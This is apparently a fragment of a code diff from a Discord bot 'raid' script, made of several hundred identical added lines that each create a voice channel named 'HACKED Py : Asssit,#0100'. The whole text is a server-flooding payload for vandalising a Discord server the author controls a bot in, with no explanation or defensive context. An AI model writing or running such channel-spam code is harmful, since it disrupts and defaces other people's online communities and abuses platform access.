+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
